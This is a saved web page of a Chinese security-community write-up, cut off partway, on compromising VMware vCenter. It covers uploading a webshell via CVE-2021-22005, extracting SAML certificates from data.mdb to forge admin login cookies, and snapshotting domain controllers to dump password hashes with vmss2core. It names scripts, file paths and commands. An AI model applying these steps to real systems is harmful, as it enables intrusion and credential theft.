@@ -1,0 +1,283 @@
+<!DOCTYPE html> <html lang="zh-cn"><head>
+<title>记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区</title>
+<base href="..">
+<meta name="pathname" content="ObsidianWebClipper/记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区.html">
+<meta name="description" content="Wiki - 记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区">
+<meta property="og:title" content="记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区">
+<meta property="og:description" content="Wiki - 记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区">
+<meta property="og:type" content="website">
+<meta property="og:url" content="ObsidianWebClipper/记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区.html">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20240621132258-520def48-2f8e-1.png">
+<meta charset="UTF-8"><meta property="og:site_name" content="Wiki"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><pre class="frontmatter language-yaml" style="display: none;"><code class="language-yaml is-loaded"><span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token string">"记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区"</span>
+<span class="token key atrule">source</span><span class="token punctuation">:</span> <span class="token string">"https://xz.aliyun.com/news/14330"</span></code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="记一次VMware_vCenter渗透过程（主要是踩坑分享）-先知社区_0">记一次VMware vCenter渗透过程（主要是踩坑分享）-先知社区</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-p"><p dir="auto">针对VMware vCenter的介绍就不多说了，大佬们可以自己搜搜。这里只分享过程和踩到的坑点&amp;技巧。</p></div><div class="el-h2"><h2 data-heading="1 坑点&amp;技巧总结" dir="auto" class="heading" id="1_坑点&amp;技巧总结_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>1 坑点&amp;技巧总结</h2></div><div class="el-p"><p dir="auto">总体流程分为三大步：<br>
+<strong>拿wenshell--&gt;获取登录Cookie--&gt;获取域控账密/hash(有域控的情况下)</strong></p></div><div class="el-p"><p dir="auto">相应的坑点&amp;技巧也分别在不同的阶段说明，不想看过程的佬可以直接看总结：</p></div><div class="el-pre"><pre><code data-line="0">拿webshell阶段：
+1. 上传webshell使用https协议；
+2. 存在多个漏洞时，优先使用CVE-2021-22005，因为该漏洞上去权限为root，不用进行提权；log4j2得到的shell一般也是root权限；
+3. 使用log4j2 Poc 时，注意/sso后面的域名信息；
+
+获取登录Cookie阶段：
+1. 3gstudent大佬优化的脚本，获取Cookie时省去了装某些Python环境的麻烦；
+2. 下载data.mdb文件后，分析不出证书，可以重新下载或者将脚本上传到目标服务器试试；
+3. 获取到Cookie后，在IP后拼接/ui访问进入控制台页面；
+4. 在控制台生成的快照可能不在本机，需要在相似名字的辅助机器找找；
+
+获取域控账密/hash阶段：
+1. 可以使用VM安装目录自带的Vmss2core,将vmem和vmsn文件转储为dmp文件；
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">过程如下：</p></div><div class="el-h2"><h2 data-heading="1 获取webshell" dir="auto" class="heading" id="1_获取webshell_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>1 获取webshell</h2></div><div class="el-h2"><h2 data-heading="1、指纹识别" dir="auto" class="heading" id="1、指纹识别_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>1、指纹识别</h2></div><div class="el-p"><p dir="auto">拿到资产<br>
+<a rel="noopener nofollow" class="external-link is-unresolved" href="https://10.x.x.x" target="_self">https://10.x.x.x</a><br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621132258-520def48-2f8e-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+棱洞识别效果：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133032-60cd8858-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-h2"><h2 data-heading="2、判断版本" dir="auto" class="heading" id="2、判断版本_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>2、判断版本</h2></div><div class="el-p"><p dir="auto"><a rel="noopener nofollow" class="external-link is-unresolved" href="https://x.x.x.x/sdk/vimServiceVersions.xml" target="_self">https://x.x.x.x/sdk/vimServiceVersions.xml</a><br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133101-7218055c-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-h2"><h2 data-heading="3、CVE-2021-22005" dir="auto" class="heading" id="3、CVE-2021-22005_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>3、CVE-2021-22005</h2></div><div class="el-p"><p dir="auto">这里使用的是cve-2021-22005，所以就只介绍这个漏洞，影响范围：<br>
+● vCenter Server 7.0 &lt; 7.0 U2c build-18356314<br>
+● vCenter Server 6.7 &lt; 6.7 U3o build-18485166<br>
+● Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)<br>
+● Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)<br>
+● 6.7 vCenters Windows版本不受影响<br>
+使用exp.py上传马儿（exp文末给出）：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133207-99dada7e-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+然而<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133220-a1380792-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+这里以为是有什么防护软件，结果发现是协议或者端口问题，只能利用https去上传马儿：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133234-a98b84c8-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+冰蝎连接：root权限<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133250-b32073c2-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+这里给出Linux下，上传的shell地址（方便后面log4j2上传webshell）：</p></div><div class="el-pre"><pre><code data-line="0">/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-h2"><h2 data-heading="2 获取vCenter Cookie登录" dir="auto" class="heading" id="2_获取vCenter_Cookie登录_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>2 获取vCenter Cookie登录</h2></div><div class="el-p"><p dir="auto">存储关键身份验证信息数据位置：<br>
+•Linux:<br>
+/storage/db/vmware-vmdir/data.mdb<br>
+•Windows<br>
+C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</p></div><div class="el-h2"><h2 data-heading="脚本一" dir="auto" class="heading" id="脚本一_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>脚本一</h2></div><div class="el-p"><p dir="auto">咱们这里是Linux<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133417-e6c45f40-2f8f-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+将data.mdb下载下来。<br>
+然后下载解密脚本</p></div><div class="el-pre"><pre><code data-line="0">https://github.com/horizon3ai/vcenter_saml_login/blob/main/vcenter_saml_login.py
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">pip3 install -r requirements.txt<br>
+OK啊，不出意料的报错了！<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133643-3dfd9ff6-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+环境问题可能会浪费很多时间，回头不行再看，这里换个脚本。</p></div><div class="el-h2"><h2 data-heading="脚本二" dir="auto" class="heading" id="脚本二_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>脚本二</h2></div><div class="el-p"><p dir="auto">该脚本是经过大佬优化的，省去了装环境的麻烦。详情见：</p></div><div class="el-pre"><pre><code data-line="0">https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">先使用这个脚本，生成如下三个文件（如果data.mdb文件太大，就可以将该脚本上传到服务器上，然后生成下面三个文件）：</p></div><div class="el-pre"><pre><code data-line="0">https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133837-81efdc2e-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+这里重命名为1.py了：<br>
+python3 1.py data.mdb<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621133821-78bf0026-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-p"><p dir="auto">再使用这个脚本：</p></div><div class="el-pre"><pre><code data-line="0">https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">生成cookie：</p></div><div class="el-pre"><pre><code data-line="0">python 2.py 10.x.x.x 10.x.x.x vsphere.local idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">其中vsphere.local是上一步获取到的Domain<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134008-b867ddf6-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+获取cookie：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134027-c3b2ddb4-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+然后访问，F12添加cookie：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134052-d299331e-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+添加完后注意，不要直接刷新，而是访问https: //ip/ui，否则就会这样<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134142-f033b9bc-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+这里在URL地址栏，拼接/ui刷新后即可进来:<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134157-f8ef988c-2f90-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-h2"><h2 data-heading="3 获取域控账密/hash" dir="auto" class="heading" id="3_获取域控账密/hash_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>3 获取域控账密/hash</h2></div><div class="el-p"><p dir="auto">进到控制台后，如果发现域控机器，就可以使用生成快照，然后用工具分析快照文件抓hash。<br>
+因为机器都是生产相关的机器，不能使用克隆虚拟机等的骚操作，所以这里只介绍生成快照的方式。</p></div><div class="el-pre"><pre><code data-line="0">方法一：Volatility来取证获取hash
+方法二：Vmss2core Dump hash
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">前期获取快照的方式都是一样的，如下所示：<br>
+如图，生成快照<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134312-25dfee8c-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+数据存储中翻文件，找刚生成的快照：不确定的话两个都找找<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134327-2ef3183c-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+这里找了好久没找到，最后发现快照在辅助域控的机器上生成：<br>
+然后就是下载。<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134338-3583f158-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-h2"><h2 data-heading="方式一 volatility" dir="auto" class="heading" id="方式一_volatility_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>方式一 volatility</h2></div><div class="el-p"><p dir="auto">使用volatility分析：</p></div><div class="el-pre"><pre><code data-line="0">https://github.com/volatilityfoundation/volatility
+https://github.com/volatilityfoundation/volatility3
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134605-8d390dd4-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+没分析出来。<br>
+volatility和volatility3都试了不行，遂放弃。</p></div><div class="el-h2"><h2 data-heading="方式二 Vmss2core" dir="auto" class="heading" id="方式二_Vmss2core_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>方式二 Vmss2core</h2></div><div class="el-p"><p dir="auto">该工具，在VM安装目录下自带，就不用去别的地方下载了。选中VM图标，右键“打开文件位置”即可。<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134617-94335446-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+需要注意的是，不能把他复制出来使用，直接把vmem和vmsn文件，复制到vmss2core所在目录即可：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134631-9c6b6c16-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-pre"><pre><code data-line="0">目标 VM 是 Microsoft Windows 8/8.1、Windows Server 2012、Windows Server 2016 、 Windows Server 2019，则执行-W8，否则使用-W：
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre><code data-line="0">vmss2core.exe -W8 "Snapshot42.vmsn" "Snapshot42.vmem"
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">执行成功，会生成memory.dmp文件，如下图所示：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134725-bc8407a6-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134809-d6f65738-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-p"><p dir="auto">接下来就是用Windbg分析了，下载链接如下：</p></div><div class="el-pre"><pre><code data-line="0">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/
